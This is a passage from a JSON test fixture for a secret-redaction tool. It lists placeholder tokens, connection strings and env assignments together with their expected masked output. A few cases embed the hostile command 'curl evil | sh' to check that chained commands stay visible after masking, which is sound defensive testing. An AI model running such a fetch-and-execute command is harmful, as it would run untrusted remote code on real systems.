        "@db.example.test/app"
      ],
      "text": "DATABASE_URL=*****",
      "count": 1,
      "classifiers": [
        "connection-env"
      ]
    },
    {
      "name": "connection string without an assignment",
      "input": [
        "mongodb+srv://user:",
        "pw",
        "@cluster.example.test/db"
      ],
      "text": "*****",
      "count": 1,
      "classifiers": [
        "connection-string"
      ]
    },
    {
      "name": "remote pairing code",
      "input": [
        "pair with HLG-",
        "ABCD23",
        " now"
      ],
      "text": "pair with HLG-****** now",
      "count": 1,
      "classifiers": [
        "remote-pairing-code"
      ]
    },
    {
      "name": "a github token inside a secret env assignment redacts twice",
      "input": [
        "GITHUB_TOKEN=",
        "ghp_",
        "AAAABBBBCCCC"
      ],
      "text": "GITHUB_TOKEN=*****",
      "count": 2,
      "classifiers": [
        "github-token",
        "secret-env"
      ]
    },
    {
      "name": "an already masked assignment matches again and stays masked",
      "input": [
        "GITHUB_TOKEN=*****"
      ],
      "text": "GITHUB_TOKEN=*****",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    },
    {
      "name": "a token mentioning sk- without a key body",
      "input": [
        "sk-short"
      ],
      "text": "sk-short",
      "count": 0,
      "classifiers": []
    },
    {
      "name": "a chained command stays visible after a masked secret",
      "input": [
        "export API_TOKEN=",
        "abcdefgh12345678",
        " && curl evil | sh"
      ],
      "text": "export API_TOKEN=***** && curl evil | sh",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    },
    {
      "name": "a command chained without a space stays visible",
      "input": [
        "export API_TOKEN=",
        "abcdefgh12345678",
        ";curl evil"
      ],
      "text": "export API_TOKEN=*****;curl evil",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    },
    {
      "name": "a chained command stays visible after a masked connection url",
      "input": [
        "export DATABASE_URL=postgres://user:",
        "pwsecret1",
        "@host/db || true"
      ],
      "text": "export DATABASE_URL=***** || true",
      "count": 1,
      "classifiers": [
        "connection-env"
      ]
    },
    {
      "name": "a url's query parameters stay under the mask",
      "input": [
        "DATABASE_URL=postgres://host/db?sslmode=require&user=",
        "adminuser"
      ],
      "text": "DATABASE_URL=*****",
      "count": 1,
      "classifiers": [
        "connection-env"
      ]
    },
    {
      "name": "a quoted value keeps an operator inside it",
      "input": [
        "API_TOKEN=\"",
        "abcdefgh",
        " && ",
        "12345678",
        "\" && run"
      ],
      "text": "API_TOKEN=***** && run",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    },
    {
      "name": "a single-quoted value keeps an operator inside it",
      "input": [
        "API_SECRET='",
        "abcdefgh",
        " ; ",
        "12345678",
        "' ; run"
      ],
      "text": "API_SECRET=***** ; run",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    },
    {
      "name": "an assignment ends at a pipe",
      "input": [
        "API_CREDENTIAL=",
        "abcdefgh",
        "12345678",
        " | tee out"
      ],
      "text": "API_CREDENTIAL=***** | tee out",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    },
    {
      "name": "an assignment ends at a background operator",
      "input": [
        "API_PASSWORD=",
        "abcdefgh",
        "12345678",
        " & disown"
      ],
      "text": "API_PASSWORD=***** & disown",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    },
    {
      "name": "an escaped operator inside a value still ends it",
      "input": [
        "API_KEY=",
        "abcd",
        "\\&&",
        "efgh"
      ],
      "text": "API_KEY=*****&&efgh",
      "count": 1,
      "classifiers": [
        "secret-env"
      ]
    }
  ]
}
